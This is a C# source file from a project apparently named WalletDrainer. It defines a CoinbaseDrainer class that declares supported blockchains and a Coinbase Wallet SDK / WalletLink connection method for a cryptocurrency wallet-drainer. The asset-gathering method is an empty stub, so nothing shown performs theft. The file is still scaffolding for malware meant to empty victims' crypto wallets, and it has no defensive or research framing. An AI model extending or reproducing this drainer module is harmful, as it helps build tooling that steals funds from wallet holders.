using WalletDrainer.Models;

namespace WalletDrainer.Wallets;

public sealed class CoinbaseDrainer : IWalletDrainer
{
    public string WalletName => "Coinbase Wallet";
    public string[] SupportedChains => ["ethereum", "bsc", "polygon", "arbitrum", "base"];

    public async Task<List<WalletAsset>> GetAssets(string address, string chain, CancellationToken ct = default)
    {
        await Task.CompletedTask;
        return [];
    }

    public bool SupportsChain(string chain) =>
        SupportedChains.Contains(chain, StringComparer.OrdinalIgnoreCase);

    public string GetConnectionMethod() => "Coinbase Wallet SDK / WalletLink";
}
